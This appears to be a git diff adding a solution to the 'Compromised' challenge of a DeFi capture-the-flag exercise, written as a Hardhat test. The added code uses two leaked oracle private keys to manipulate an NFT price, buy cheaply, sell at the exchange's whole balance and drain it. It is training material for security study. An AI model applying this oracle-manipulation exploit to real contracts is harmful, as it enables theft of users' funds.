@@ -1,5 +1,6 @@
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
+const { Wallet } = require('ethers');
 
 describe('Compromised challenge', function () {
 
@@ -59,8 +60,32 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
+    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // decoded using online tools: cryptii, ...
+        const PRIVATE_KEY1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'
+        const PRIVATE_KEY2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+
+        const wallet1 = new Wallet(PRIVATE_KEY1, ethers.provider)
+        const wallet2 = new Wallet(PRIVATE_KEY2, ethers.provider)
+
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther('0.01'))
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther('0.01'))
+
+        await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther('0.01') })
+
+        const balanceOfExchange = await ethers.provider.getBalance(this.exchange.address)
+
+        await this.oracle.connect(wallet1).postPrice("DVNFT", balanceOfExchange)
+        await this.oracle.connect(wallet2).postPrice("DVNFT", balanceOfExchange)
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0)
+
+        await this.exchange.connect(attacker).sellOne(0)
+
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther("999"));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther("999"));
     });
 
     after(async function () {
